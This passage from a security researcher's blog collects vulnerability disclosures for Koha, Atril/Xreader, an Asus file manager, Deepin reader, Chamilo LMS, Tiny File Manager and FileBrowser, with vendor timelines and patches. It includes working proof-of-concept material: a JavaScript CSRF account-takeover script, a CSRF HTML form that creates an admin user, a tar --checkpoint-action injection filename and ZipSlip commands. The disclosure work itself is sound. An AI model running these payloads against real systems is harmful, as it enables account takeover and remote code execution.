-----------------------------------------------------------

This above code will fetch server time from the target and schedules a task(server time + 2 minutes) with the arbitrary injected command.

xsrf_ato.js (Account takeover):

-------------------------------------------------------------
```
fetch("/cgi-bin/koha/members/member-password.pl?member=1").then(response => response.text()).then((response) => {window.csrf_token = response.match(/value=\"(.{92})\"/)[1];
const xhr = new XMLHttpRequest();
xhr.open("POST","/cgi-bin/koha/members/member-password.pl",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send("destination=&borrowernumber=1&member=1&newuserid=admin&newpassword=Koha@pwn1234&newpassword2=Koha@pwn1234&csrf_token="+csrf_token);
}).catch(err => console.log(err))

```
-------------------------------------------------------------

This above JS will steal the CSRF token and performs a password reset. It sets admin:Koha@pwn1234 as Admin Staff credentials.

Thanks for reading,
Febin

```

# [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)

[17th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/#respond)

*A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.*

My 9th and 11th CVEs

**Affected Operating Systems:**

Linux Mint
Kali Linux (Popular OS among Security professionals, and researchers)
Parrot OS (Popular OS among Security professionals, and researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers) and Xreader Document Viewer (Default doc reader in Linux Mint)

**Vulnerability Summary:**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Linux Mint Xreader. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of CBT files. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user.

This vulnerability is due to a bad code segment in Atril and Xreader responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause – Vulnerable Code segment in both doc viewers (comics-document.c):

```

static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
    {"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
    {NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
    {"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
    {NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
    {"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

    /* UNARCHIVER */
    {"unar -o -"        , "%s %s"          , NULL         , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /\* tar \*/ section, it actually calls the following shell command, “tar -xOf -tf ![]()“. This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program ‘–checkpoint-action’ to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like ‘–checkpoint-action=EXEC=bash -c “whoami>/tmp/who.txt”;.jpg’.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril and Xreader are forks of Evince, this vulnerability was present in both Atril and Xreader. Atril’s team fixed the vulnerability at that time by adding a piece of code that quits Atril’s process if the CBT file with “–checkpoint-action=” in its name. The following was the patch (comics-document.c) (line – 983):

```

extract_argv (EvDocument *document, gint page)
{
    ComicsDocument *comics_document = COMICS_DOCUMENT (document);
    char **argv;
    char *command_line, *quoted_archive, *quoted_filename;
    GError *err = NULL;

    if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
    {
        g_warning ("File unsupported\n");
        gtk_main_quit ();
    }

```

As you can see, it throws a “File Unsupported” message to the console and quits when it sees “–checkpoint-action=” in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the “gtk\_main\_quit ();” function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

In Linux Mint (Cinnamon Desktop Environment), the target user must open the document to trigger the payload because Linux Mint uses Xreader and Xreader doesn’t have a previewer.

**Exploit**: <https://github.com/febinrev/atril_cbt-inject-exploit.git>

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

**Github Advisory on MATE Atril**: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

**Zero Day Initiative Advisory on Mint Xreader**: <https://www.zerodayinitiative.com/advisories/ZDI-23-1836/>

Thanks for Reading!

# [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)

[17th January 202417th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/#respond)

My 8th and 10th CVEs

**Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution**

### CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):

RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux’s MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu, and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn’t stop an attacker from achieving Remote Command Execution on the target system.

I named this vulnerability “*Slippy-Book*“

**Severity**: CRITICAL

**Impact**: Remote Command Execution, System compromise

This can be used particularly against security researchers who mostly use Kali and Parrot OS and also desktop users who use Linux Mint.

Remote Command Execution can be achieved in many ways:

1. The most efficient way to achieve RCE is by placing a malicious .desktop entry under $HOME/.config/autostart/ directory, and the .desktop will execute when the user logs out and logs back in, the autostart/ directory acts as the startup folder in Windows, and it will execute all the .desktop entries that are present inside at startup. We can place an infinite number of .desktop files with random names under autostart/ directory to achieve RCE, no need to overwrite any file.
2. By writing the authorized\_keys file under the .ssh/ directory inside the user’s home, in this way, an attacker can immediately achieve Command Execution via SSH if the target system has SSH enabled.
3. RCE can be achieved in another way just by writing files like .bash\_profile, .bash\_login, .zshrc, .cshrc, .vimrc, .xsession under the user’s home directory. Many of these files might be missing in operating systems, it depends on the OS. In Ubuntu-mate and Linux Mint, .bash\_profile, and .bash\_login files won’t be present, and placing those files with malicious commands written inside under the user’s home directory will result in RCE if the user logs in to the system without GUI mode, like SSH login.
4. Another way to achieve control over the target system is by writing files in places like ~/.local/bin, ~/.local/lib/python3.9/site-packages/, ~/.local/lib/python3.10/site-packages/, ~/.local/lib/python3.11/site-packages/, ~/.local/share/applications/, /var/www/html/, /var/www/ and so on.

**[+] Finding the Vulnerability:**

I was researching archive file formats such as Zip, Tar, Rar, etc., and the software that works with archives, then I got the idea to get into the Ebook file format (.epub) because .epub files are really Zip archives with some XML, HTML and other files packed inside. Even though Epub files are just zip files, epub format has its own standards.

**[\*] How did I find the vulnerability?**

People have been exploiting Archives since the early 2000s, researchers are constantly looking into Archives and archiving software for vulnerabilities and Zero-day acquisition companies like Zerodium are willing to pay million-dollar bounties for zero-days in archives and archivers. So, I thought to give it a try. I am not a binary ninja or kernel exploitation specialist to pull off a highly complicated exploit chain that could give me a code execution or elevation of privilege. My approach was, “What is the dumbest thing that could possibly work”.

Path traversal is one of the most common vulnerabilities that affect Archives and software that deals with archives, Zip Slip is one such vulnerability that leads to arbitrary file overwrite and Code execution that was disclosed on the 5th of June 2018 by the Snyk Security team, Zip Slip was a widespread vulnerability affected many software and libraries that handle Zip archives. Path traversal in zip archives was an ancient bug in the wild even before that was disclosed by the Snyk Security team. It is still present in many software including some Android file managers.
Another such vulnerability was discovered in WinRar with the CVE Id CVE-2018-20250, in which a potential path traversal can be exploited to achieve RCE.

Archives were developed in a period when people not much cared about security, and that’s where all the problems began.

Knowing that Path traversals can be a problem in the archive, I started testing it out on EPUB. I started off by downloading a sample .epub file from the internet and started playing with it. Then I did something really interesting, I added my own files into the .epub file by using the “zip -u” command.

`$ zip -u sample1.epub hello.txt`

And then when I listed the contents of the EPUB archive using “unzip -l”, I was able to see my hello.txt was present inside the EPUB. Perfect! So what’s next? As I said above, my approach was, “What is the dumbest thing that could possibly work” so what I did next was add a bunch of Path Traversal gadgets (../../) at the beginning of my filename hello.txt.

I was using Kali Linux and logged in as root during the research on archives.
Then, I navigated to the directory graphically and clicked on the EPUB document, the document opened up and nothing happened but after that, I noticed something really interesting, the hello.txt file was present under my Kali Linux’s root (/). I tried overwriting existing files but that didn’t work.

Then, I tried changing the filename to something like ../../../../tmp/test.txt and that worked too, a file named test.txt was successfully created under /tmp upon opening the epub document. First I thought it was a vulnerability in Kali Linux and downloaded the latest ISO of Kali from their official site and built a VM to test it out. Guess what? It worked on the latest version of Kali too. The software responsible for opening epub files in Kali is Atril, I then went to Google to read more about Atril Document Viewer and found out that it is the default Document reader for MATE desktop environment. After knowing that, I immediately switched to my Parrot OS VM to reproduce the same vulnerability, and that worked in Parrot OS as well. I also tested it out on Ubuntu’s MATE variant called Ubuntu-MATE and found that it was also vulnerable. The MATE desktop environment itself is vulnerable.

I also tried to reproduce this on various other Linux distros with other Desktop Environments and found out that Linux Mint is also vulnerable.

#### [+] Achieving Remote Command Execution:

This vulnerability can’t be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn’t stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized\_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn’t everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that’ll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there’s a small problem, the target user’s username is required for successful exploitation of this bug. What if we don’t know the username? No Easy RCE? Needs to guess Username? Needs to try random common usernames? Let’s see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user’s home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit\_rce.sh) and a script to write and include custom files for path traversal (exploit\_file\_write.sh).

**Exploit**: <https://github.com/febinrev/slippy-book-exploit.git>

**Zero Day Initiative Advisory:** <https://www.zerodayinitiative.com/advisories/ZDI-23-1835/>

*Update the Document Viewers to the latest version on your Distros!*

Thanks for Reading.

# [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/#respond)

**Zip Path traversal(ZipSlip) to arbitrary file write/overwrite in Asus default Android FileManager affecting all Asus Smartphones.**

This vulnerability is found in the latest version of the default file manager of Asus smartphones which comes pre-installed with the devices and also can’t be uninstalled. An attacker can create a crafted zip archive with path traversal to write/overwrite files in arbitrary locations on the target Smartphone. This vulnerability is dangerous as this can be abused to overwrite targetted files on the victim device or overwrite files that have patterns in the filenames like the photos taken from the camera, WhatsApp audio messages, WhatsApp Voice notes, Telegram Files, and much more. Also, Asus FileManager doesn’t prompt user confirmation before overwriting existing files which makes it easier for an attacker to exploit the vulnerability to overwrite existing files on the victim’s device.

**Severity**: *HIGH*

Affected Software and Version: Asus File Manager(com.asus.filemanager) <= 2.8.0.85\_230220 latest

**Proof-Of-Concept:**

1. Craft a path-traversal zip archive (here I created it on my Linux machine)

`$ echo PWNED > 001001001001001sdcard1poc1pwn.txt`

`$ zip trav.zip 001001001001001sdcard1poc1pwn.txt`

`$ sed -i s/"0"/"."/g trav.zip`

`$ sed -i s/"1"/"\/"/g trav.zip`

2. Transfer the zip file (trav.zip) to the Asus or Tecno device.
3. Open the archive and extract it with the default file manager
4. You will be able to see a file named pwn.txt under /sdcard/poc/pwn.txt

**Tested Devices:**

Asus Rog phone 5 and other devices with Asus Filemanager installed

# [CVE-2023-50254: Critical RCE in Deepin Linux Desktop OS’s default document reader](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/)

[22nd December 202322nd December 2023](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/#respond)

This is my 6th published CVE.

### Summary

Deepin Linux’s default document reader “**deepin-reader**” software ***<** **6.0.7***suffers from a serious vulnerability due to a design flaw that leads to Remote Command Execution via crafted docx document.

### Details

Deepin-reader is the default document reader for the Operating System Deepin Linux. The deepin-reader performs some shell command operations while dealing with docx document format.

1. When opening a docx document, deepin-reader creates a temporary directory under /tmp and place the docx document under the directory
2. Then deepin-reader calls the “unzip” shell command to extract the docx file
3. After the extraction process, deepin-reader calls “pandoc” command to convert the docx file to an HTML file named “temp.html” under word/ directory (created when the docx file is extracted with unzip).
   The command will look something like this, “pandoc temp.docx -o word/temp.html
4. Then deepin-reader will try to convert that HTML file to PDF and open the pdf.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/12/image.png?w=1024)

This happens when we open a docx file in Deepin Linux OS.

This behavior can be exploited by placing a symlink named word/temp.html inside a crafted malicious docx pointing to any file inside the target system.

So, while opening the docx file, pandoc will write to the system file that the symlink word/temp.html is pointing to.

This is a File overwrite vulnerability.
A Remote Code Execution can be achieved by overwriting files like .bashrc, .bash\_login etc. Rce will be triggered when the user opens the terminal.

We can force pandoc to write/overwrite files(.bashrc) in the right format to execute arbitrary commands.

**Advisory:** <https://github.com/linuxdeepin/developer-center/security/advisories/GHSA-q9jr-726g-9495>

Update Deepin Linux and deepin-reader to the latest version.

**Download the PoC exploit**: [https://github.com/febinrev/deepin-linux\_reader\_RCE-exploit/](https://github.com/febinrev/deepin-linux_reader_RCE-exploit/tree/main)

# [CVE-2021-40662 Chamilo LMS 1.11.14 RCE](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/)

[22nd March 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/03/22/cve-2021-40662-chamilo-lms-1-11-14-rce/#respond)

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/03/exploit-300x157-1.jpg?w=300)

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

This is Febin, a Security Researcher. This article is about my third CVE that I got for finding a Remote Code Execution in a popular Learning Management Software named “**Chamilo LMS**”.

This is a chained exploit. First, I found a **CSRF** in the plugin upload feature which leads to Remote Code Execution which is then combined with a stored **XSS** to achieve **Zero-click RCE**.

**XSS + CSRF + Malicious Plugin Upload = RCE.** Boom!

**Product Information**: Chamilo is an e-learning platform, also called “LMS”, published under the GNU/GPLv3+ license. It has been used by more than 30M people worldwide since its inception in 2010.

**Vendor Homepage:** <https://chamilo.org/en/>

<https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues#Issue-79-2021-07-17-Moderate-impact-Low-risk-CSRF-in-global-chat-and-social-wall>

**Disclosure Timeline:**

July 27, 2021 – Contacted the vendor and reported the vulnerability

July 28, 2021 – Vendor replies back

August 2, 2021 – Vulnerability has been patched in version **1.11.16**

March 21, 2022 – CVE ID was assigned. CVE-2021-40662

**CVE Description**: *Chamilo LMS v1.11.14 was discovered to contain a zero click code injection vulnerability which allows attackers to execute arbitrary code via a crafted plugin. This vulnerability is triggered through user interaction with the attacker’s profile page.*

* One-Click Technique: An Attacker who has a student account can create a malicious web page or a malicious SVG image file and upload the file to the “My Productions” section of the student profile page, then he can copy the URL of that file and send it to the Chamilo Admin User. When the Admin user loads the file in his browser with an active chamilo session, in the background it will upload a plugin (.zip file) to chamilo. Then the attacker can simply navigate to /plugin/exploited-directory/ and execute malicious commands.
* “Zero Click” technique: In this case, the attacker abuses the “My Diplomas” feature and injects malicious javascript in it, and when the Admin visits the Attacker’s (student) profile page or Portfolio, the malicious javascript gets executed and the malicious plugin gets uploaded to the server. After that, the attacker can simply navigate to /plugin/exploit/ directory and execute the shell.php script and execute arbitrary commands. Advantages of this exploit: No need to upload a malicious file to /app/upload/users/ directory , No need to send a link or URL to the Admin. When the admin visits attacker’s profile, the attacker gets the RCE 😉 .

**Reference**: <https://github.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE>

**Video Reference**:

<https://github.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/raw/main/chamilo_csrf-rce_exploit.mp4>

**Exploit Code:** <https://raw.githubusercontent.com/febinrev/CVE-2021-46398_Chamilo-LMS-RCE/main/zero-click.ht>

**Remediation:**

The Vulnerability has been patched from version 1.11.16

[<https://github.com/chamilo/chamilo-lms/commit/c75b06adb816565e63f0738c028bd870c49b4de9>](https://github.com/chamilo/chamilo-lms/commit/c75b06adb816565e63f0738c028bd870c49b4de9)

Thanks

# [Tiny File Manager Authenticated RCE](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

[23rd January 202215th March 2022](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/#respond)

**CVE-2021-45010**

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of which was a software named “[Tiny File Manager](https://github.com/prasathmani/tinyfilemanager)“. While poking around I was able to find an awesome vulnerability in the application that leads to code execution on the server. This article is going to be on that vulnerability.

**Disclosure Timeline:**

A similar Vulnerability was also reported by another researcher named “Omri Inbar”.

My disclosure timeline:

September 16, 2021 – Contacted the developer and reported the vulnerability

September 17, 2021 – Developer replies back

September 20, 2021 – Developer verified the issue

September 26, 2021 – I patched the source code, fixed the RCE, and sent a pull request to the original repository.

November 12, 2021 – The developer merged the commit. The vulnerability has been fixed.

**CVE-2021-45010**: A Path traversal vulnerability in the file upload functionality in tinyfilemanager.php in Tiny File Manager Project’s Tiny File Manager <= 2.4.3 allows remote attackers with valid user accounts to upload malicious PHP files to the webroot and achieve code execution on the target server.

**Vendor/Software Details**

TinyFileManager is a web-based file manager and it is a simple, fast, and small file manager with a single file, a multi-language ready web application for storing, uploading, editing, and managing files and folders online via the web browser. The Application runs on PHP 5.5+, It allows the creation of multiple users and each user can have its own directory and build-in support for managing text files with cloud9 IDE and it supports syntax highlighting for over 150+ languages and over 35+ themes.

Link: <https://github.com/prasathmani/tinyfilemanager>

**Authenticated RCE**

Tiny File Manager is a php based software. This particular vulnerability is present in the tinyfilemanager.php script. When the user logs in to the application, he is allowed to upload, download, edit files and those file are stored in a specific directory which is been specified in “config.php”. The particular vulnerability that I have found allows the user to upload files beyond the specified directory by tampering the “fullpath” parameter and add a bunch of “../” in front of the actual filename thus leads to breaking out of the file root directory that is specified in config.php.

This can be exploited to place php web-shells inside the web root directory of Tiny File Manager and achieve RCE.

Proof Of Concept:

*RCE*
1. An Attacker who has admin credentials or admin access to “Tiny FIle manager” app can upload arbitrary files to the server via Path Traversal i.e, appending “../../../../../../../” to the “fullpath parameter in the upload feature.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce.png?w=1024)

2. If the attacker could get the full Web Root directory of the “Tiny File Manager” app, he could upload php files there to achieve RCE.

3. To get the full Webroot directory path, we can abuse a path disclosure vulnerability in the URL upload feature. When a random rubbish URL is given as input, it throws an error message that reveals the full Webroot directory path.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_disclose.png?w=1024)

4. By combining these, we can achieve Command execution on the server.

I created an exploit script that automatically exploits the bug and get a shell:

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce3.png?w=1024)

Download the Exploit: *<https://raw.githubusercontent.com/febinrev/tinyfilemanager-2.4.3-exploit/main/exploit.sh>*

**The Patch:**

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA=w484-h87)](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA%3Ds1232)

<https://github.com/prasathmani/tinyfilemanager/pull/636/files/a93fc321a3c89fdb9bee860bf6df5d89083298d1>

👉  *Replace “./” with “\_” fixes the issue.*

**Thank You**

# [Critical CSRF in FileBrowser](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

